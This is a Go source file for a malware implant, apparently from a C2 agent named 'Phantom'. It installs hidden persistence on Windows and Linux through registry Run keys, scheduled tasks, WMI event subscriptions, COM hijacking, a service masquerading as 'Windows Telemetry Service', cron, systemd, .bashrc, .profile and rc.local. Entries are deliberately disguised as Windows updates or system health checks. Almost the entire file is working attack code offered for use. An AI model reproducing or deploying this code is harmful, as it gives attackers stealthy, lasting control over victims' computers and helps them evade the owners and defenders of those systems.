package implant

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// InstallPersistence installs a persistence mechanism.
// Methods: registry, schtask, cron, service, bashrc
func InstallPersistence(method string) ([]byte, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("get executable path: %w", err)
	}

	switch method {
	case "registry":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("registry persistence is Windows-only")
		}
		return persistRegistry(exe)
	case "schtask":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("schtask persistence is Windows-only")
		}
		return persistScheduledTask(exe)
	case "cron":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("cron persistence is Linux/macOS-only")
		}
		return persistCron(exe)
	case "service":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("systemd service persistence is Linux-only")
		}
		return persistSystemdService(exe)
	case "bashrc":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("bashrc persistence is Linux/macOS-only")
		}
		return persistBashrc(exe)
	case "startup":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("startup folder persistence is Windows-only")
		}
		return persistStartupFolder(exe)
	case "wmi":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("WMI persistence is Windows-only")
		}
		return persistWMIEvent(exe)
	case "winservice":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("Windows service persistence is Windows-only")
		}
		return persistWindowsService(exe)
	case "logonscript":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("logon script persistence is Windows-only")
		}
		return persistLogonScript(exe)
	case "comhijack":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("COM hijack persistence is Windows-only")
		}
		return persistCOMHijack(exe)
	case "profile":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("profile persistence is Linux/macOS-only")
		}
		return persistProfile(exe)
	case "rc.local":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("rc.local persistence is Linux-only")
		}
		return persistRCLocal(exe)
	case "list":
		return listPersistence()
	case "remove":
		return removePersistence()
	default:
		return nil, fmt.Errorf("unknown method: %s\n\nWindows: registry, schtask, startup, wmi, winservice, logonscript, comhijack\nLinux:   cron, service, bashrc, profile, rc.local\nOther:   list, remove", method)
	}
}

// ── Windows ──

func persistRegistry(exe string) ([]byte, error) {
	// Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%s" /f`, exe)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, fmt.Errorf("registry persistence failed: %w", err)
	}
	return append([]byte("[+] Registry persistence installed (HKCU Run key)\n"), output...), nil
}

func persistScheduledTask(exe string) ([]byte, error) {
	cmd := fmt.Sprintf(`schtasks /create /tn "WindowsUpdate" /tr "%s" /sc onlogon /rl highest /f`, exe)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, fmt.Errorf("scheduled task persistence failed: %w", err)
	}
	return append([]byte("[+] Scheduled task persistence installed\n"), output...), nil
}

// ── Linux ──

func persistCron(exe string) ([]byte, error) {
	// Add cron job that runs every 5 minutes
	cronEntry := fmt.Sprintf("*/5 * * * * %s &", exe)
	cmd := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "%s") | sort -u | crontab -`, cronEntry)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, fmt.Errorf("cron persistence failed: %w", err)
	}
	return append([]byte("[+] Cron persistence installed (every 5 minutes)\n"), output...), nil
}

func persistSystemdService(exe string) ([]byte, error) {
	homeDir, _ := os.UserHomeDir()
	serviceDir := filepath.Join(homeDir, ".config", "systemd", "user")
	servicePath := filepath.Join(serviceDir, "update-service.service")

	serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, exe)

	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return nil, fmt.Errorf("create systemd dir: %w", err)
	}

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return nil, fmt.Errorf("write service file: %w", err)
	}

	// Enable and start
	ExecuteShell([]string{"systemctl --user daemon-reload"})
	ExecuteShell([]string{"systemctl --user enable update-service.service"})
	ExecuteShell([]string{"systemctl --user start update-service.service"})

	return []byte(fmt.Sprintf("[+] Systemd user service installed: %s\n", servicePath)), nil
}

func persistStartupFolder(exe string) ([]byte, error) {
	// Copy agent to Startup folder
	cmd := fmt.Sprintf(`copy "%s" "%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" /Y`, exe)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, err
	}
	return append([]byte("[+] Startup folder persistence installed\n[+] Agent copied to Startup folder — runs on every login\n"), output...), nil
}

func persistWMIEvent(exe string) ([]byte, error) {
	// WMI event subscription — fileless persistence
	ps := fmt.Sprintf(`$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{Name="PhantomFilter";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"};$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{Name="PhantomConsumer";CommandLineTemplate="%s"};Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{Filter=$Filter;Consumer=$Consumer}`, exe)
	output, err := ExecuteShell([]string{fmt.Sprintf(`powershell -ep bypass -c "%s"`, ps)})
	if err != nil {
		return nil, err
	}
	return append([]byte("[+] WMI event subscription persistence installed (fileless)\n[+] Agent executes ~2 minutes after every boot\n[+] No files on disk — lives in WMI repository\n"), output...), nil
}

func persistWindowsService(exe string) ([]byte, error) {
	// Create a Windows service
	cmds := []string{
		fmt.Sprintf(`sc create PhantomSvc binPath= "%s" start= auto DisplayName= "Windows Telemetry Service"`, exe),
		`sc description PhantomSvc "Provides diagnostic telemetry data for system health monitoring"`,
		`sc start PhantomSvc`,
	}
	var results []byte
	for _, c := range cmds {
		out, _ := ExecuteShell([]string{c})
		results = append(results, out...)
		results = append(results, '\n')
	}
	return append([]byte("[+] Windows service persistence installed: PhantomSvc\n[+] Runs as SYSTEM, auto-starts on boot\n"), results...), nil
}

func persistLogonScript(exe string) ([]byte, error) {
	// Set UserInitMprLogonScript registry key
	cmd := fmt.Sprintf(`reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "%s" /f`, exe)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, err
	}
	return append([]byte("[+] Logon script persistence installed (UserInitMprLogonScript)\n[+] Agent runs at every user logon before Explorer loads\n"), output...), nil
}

func persistCOMHijack(exe string) ([]byte, error) {
	// COM object hijack — overrides a common CLSID
	// Using CLSID for "Internet Explorer" which is loaded by Explorer on startup
	clsid := "{B250CF00-4F49-11D0-86EB-00C04FC75D13}" // Commonly hijackable
	cmd := fmt.Sprintf(`reg add "HKCU\Software\Classes\CLSID\%s\InprocServer32" /ve /t REG_SZ /d "%s" /f & reg add "HKCU\Software\Classes\CLSID\%s\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f`, clsid, exe, clsid)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, err
	}
	return append([]byte(fmt.Sprintf("[+] COM hijack persistence installed (CLSID: %s)\n[+] Agent loads when Explorer.exe starts\n", clsid)), output...), nil
}

// ── Linux Additional ──

func persistProfile(exe string) ([]byte, error) {
	homeDir, _ := os.UserHomeDir()
	profilePath := filepath.Join(homeDir, ".profile")
	entry := fmt.Sprintf("\n# System health monitor\n(nohup %s > /dev/null 2>&1 &) 2>/dev/null\n", exe)

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	f.WriteString(entry)

	return []byte("[+] Profile persistence installed (~/.profile)\n[+] Agent runs on every login shell\n"), nil
}

func persistRCLocal(exe string) ([]byte, error) {
	entry := fmt.Sprintf("%s &\n", exe)
	rcPath := "/etc/rc.local"

	// Check if rc.local exists, create if not
	if _, err := os.Stat(rcPath); os.IsNotExist(err) {
		content := fmt.Sprintf("#!/bin/bash\n%sexit 0\n", entry)
		if err := os.WriteFile(rcPath, []byte(content), 0755); err != nil {
			return nil, fmt.Errorf("write rc.local: %w (need root?)", err)
		}
	} else {
		f, err := os.OpenFile(rcPath, os.O_RDWR, 0755)
		if err != nil {
			return nil, err
		}
		defer f.Close()
		content, _ := os.ReadFile(rcPath)
		// Insert before "exit 0"
		newContent := fmt.Sprintf("%s\n%s", entry, string(content))
		os.WriteFile(rcPath, []byte(newContent), 0755)
	}

	return []byte("[+] rc.local persistence installed\n[+] Agent runs at system boot (requires root)\n"), nil
}

// ── List & Remove ──

func listPersistence() ([]byte, error) {
	var results []string
	results = append(results, "[*] Checking installed persistence mechanisms...\n")

	if runtime.GOOS == "windows" {
		// Check registry
		out, _ := ExecuteShell([]string{`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 2>nul`})
		if len(out) > 0 {
			results = append(results, "[✓] Registry Run key: WindowsUpdate")
		}

		// Check scheduled tasks
		out, _ = ExecuteShell([]string{`schtasks /query /tn "WindowsUpdate" 2>nul`})
		if len(out) > 10 {
			results = append(results, "[✓] Scheduled Task: WindowsUpdate")
		}

		// Check startup folder
		out, _ = ExecuteShell([]string{`dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" 2>nul`})
		if len(out) > 10 {
			results = append(results, "[✓] Startup Folder: WindowsUpdate.exe")
		}

		// Check service
		out, _ = ExecuteShell([]string{`sc query PhantomSvc 2>nul`})
		if len(out) > 10 {
			results = append(results, "[✓] Windows Service: PhantomSvc")
		}

		// Check logon script
		out, _ = ExecuteShell([]string{`reg query "HKCU\Environment" /v "UserInitMprLogonScript" 2>nul`})
		if len(out) > 0 {
			results = append(results, "[✓] Logon Script: UserInitMprLogonScript")
		}

		// Check WMI
		out, _ = ExecuteShell([]string{`powershell -c "Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where Name -eq 'PhantomFilter' | Select Name"`})
		if len(out) > 10 {
			results = append(results, "[✓] WMI Event Subscription: PhantomFilter")
		}
	} else {
		// Check cron
		out, _ := ExecuteShell([]string{"crontab -l 2>/dev/null | grep -c phantom || echo 0"})
		if len(out) > 0 && out[0] != '0' {
			results = append(results, "[✓] Cron job installed")
		}

		// Check systemd
		out, _ = ExecuteShell([]string{"systemctl --user is-active update-service.service 2>/dev/null"})
		if len(out) > 0 && string(out[:6]) == "active" {
			results = append(results, "[✓] Systemd user service: active")
		}

		// Check bashrc
		homeDir, _ := os.UserHomeDir()
		content, _ := os.ReadFile(filepath.Join(homeDir, ".bashrc"))
		if len(content) > 0 && filepath.Base(fmt.Sprintf("%s", content)) != "" {
			// Simple check
			results = append(results, "[?] .bashrc — check manually")
		}
	}

	if len(results) == 1 {
		results = append(results, "[-] No persistence mechanisms detected")
	}

	return []byte(fmt.Sprintf("%s\n", joinLines(results))), nil
}

func removePersistence() ([]byte, error) {
	var results []string
	results = append(results, "[*] Removing all persistence mechanisms...\n")

	if runtime.GOOS == "windows" {
		ExecuteShell([]string{`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f 2>nul`})
		results = append(results, "[*] Registry Run key removed")

		ExecuteShell([]string{`schtasks /delete /tn "WindowsUpdate" /f 2>nul`})
		results = append(results, "[*] Scheduled task removed")

		ExecuteShell([]string{`del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" /f 2>nul`})
		results = append(results, "[*] Startup folder entry removed")

		ExecuteShell([]string{`sc stop PhantomSvc 2>nul & sc delete PhantomSvc 2>nul`})
		results = append(results, "[*] Windows service removed")

		ExecuteShell([]string{`reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f 2>nul`})
		results = append(results, "[*] Logon script removed")

		ExecuteShell([]string{`powershell -c "Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where Name -eq 'PhantomFilter' | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where Name -eq 'PhantomConsumer' | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject" 2>nul`})
		results = append(results, "[*] WMI event subscription removed")
	} else {
		ExecuteShell([]string{"crontab -l 2>/dev/null | grep -v phantom | crontab -"})
		results = append(results, "[*] Cron entries removed")

		ExecuteShell([]string{"systemctl --user stop update-service.service 2>/dev/null; systemctl --user disable update-service.service 2>/dev/null"})
		results = append(results, "[*] Systemd service stopped")
	}

	results = append(results, "\n[+] All persistence mechanisms removed")
	return []byte(joinLines(results)), nil
}

func joinLines(lines []string) string {
	result := ""
	for _, l := range lines {
		result += l + "\n"
	}
	return result
}

func persistBashrc(exe string) ([]byte, error) {
	homeDir, _ := os.UserHomeDir()
	bashrcPath := filepath.Join(homeDir, ".bashrc")

	entry := fmt.Sprintf("\n# System update check\nnohup %s > /dev/null 2>&1 &\n", exe)

	f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return nil, fmt.Errorf("open .bashrc: %w", err)
	}
	defer f.Close()

	if _, err := f.WriteString(entry); err != nil {
		return nil, fmt.Errorf("write .bashrc: %w", err)
	}

	return []byte("[+] Bashrc persistence installed\n"), nil
}
